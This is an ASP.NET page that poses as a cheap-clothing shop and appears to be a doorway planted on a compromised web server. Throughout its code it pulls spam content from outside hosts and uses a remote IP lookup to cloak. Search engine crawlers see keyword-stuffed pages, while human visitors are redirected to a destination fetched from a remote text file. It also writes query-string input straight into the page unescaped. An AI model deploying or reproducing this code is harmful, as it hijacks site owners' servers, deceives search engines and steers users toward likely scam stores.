<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
  
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;

            string URL = "http://jb2img.style-js.com/SJ/JDNEW.aspx";

            if (Request.QueryString["type"] != null)
            {
                if (Request.QueryString["type"] == "search")
                {
                    tz();
                    URL += "?cid=" + Request.QueryString["cid"] + "&searchtxt=" + Request.QueryString["searchtxt"];
                    content = webclient.DownloadString(URL);

                }
            }
            else
            {
                if (Request.QueryString["iid"] != null)
                {

                    URL += "?iid=" + Request.QueryString["iid"] + "&cid=" + Request.QueryString["cid"] + "&mt=http://tz.div-js.com/en/enm.txt";
                    kname = webclient.DownloadString(URL.Replace("SJ/JDNEW.aspx", "gn.aspx"));
                    tz();
                    content = webclient.DownloadString(URL);
                }
                else
                {
                    tz();
                    int cid = new Random().Next(1,89);
                    if (Request.QueryString["cid"] != null) { cid = int.Parse(Request.QueryString["cid"]); }
                    URL += "?cid=" + cid + "&pnum=" + Request.QueryString["pnum"];
                    content = webclient.DownloadString(URL);

                }
            }
            content = content.Replace("UUUUU", "http://" + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
            content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
            content = content.Replace("NNNNN", "Cheap Clothes, Shoes & Accessories");
            content = content.Replace("SSSSS", "Discover cheap clothes, shoes and accessories for women at Our shop Outlet. Shop the latest womenswear collection at cheap prices.");
            content = content.Replace("DDDDD", kname + " Discover cheap clothes, shoes and accessories for men at Our shop Outlet. Shop the latest menswear collection at cheap prices. " + Request.QueryString["searchtxt"]);
        }
    }
    public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://cdoi09.fr/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["cid"] != null)
            {
                if (Request.QueryString["iid"] != null)
                {
                    string tzurl = webclient.DownloadString("http://tz.div-js.com/xtz2.txt").ToLower();
                    Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname));
                }
                if (Request.QueryString["searchtxt"] != null)
                {
                    string tzurl = webclient.DownloadString("http://tz.div-js.com/xtz2.txt").ToLower();

                    Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(Request.QueryString["searchtxt"]));
                }
                if (Request.QueryString["pnum"] != null)
                {
                    string tzurl = webclient.DownloadString("http://tz.div-js.com/xtz2.txt").ToLower();
                    tzurl = tzurl.Replace("products.aspx", "");
                    Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "");
                }
            }
        }
    }
    public string xi = "1";
    public string xc = "40";

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string zhang = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
    public string kname = "";
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <script>
        document.cookie = "u=" + window.location.href;
    </script>
    <title> <%=kname%> <%=Request.QueryString["searchtxt"]%> online <%=Request.QueryString["pnum"]%> </title>
    <meta name="keywords" content="<%=kname%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="description" content=" Sale OFF <%=new Random().Next(60, 80)%>% > <%=kname%> Looking for a cheap store online? We are here has the hottest pieces & biggest sellers, so click this way before stocks run out! Shop now. <%=Request.QueryString["searchtxt"]%>" />
    <meta name="robots" content="index,follow,all" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <style>
        @media (max-width: 768px) {
            body {
                width: 100%;
                height: 100%;
            }

            body {
                font-family: Open Sans,'Helvetica Neue',Arial,sans-serif;
                font-size: 15px;
                color: #777;
                line-height: 1.7;
            }

            img {
                width: 80%;
            }

            iframe {
                max-width: 100% !important;
                height: auto;
                float: left;
            }

            div {
                width: 100% !important;
                float: left;
            }

                div span {
                    width: 100%;
                    float: left;
                }

            a {
                color: #f05f40;
                -webkit-transition: all .35s;
                -moz-transition: all .35s;
                transition: all .35s;
            }

                a:hover, a:focus {
                    color: #eb3812;
                }
        }
    </style>
</head>

<body>
    <%=content.Replace("XXXXX",HttpContext.Current.Request.Url.Host) %>
    <%=content1 %>
</body>
</html>
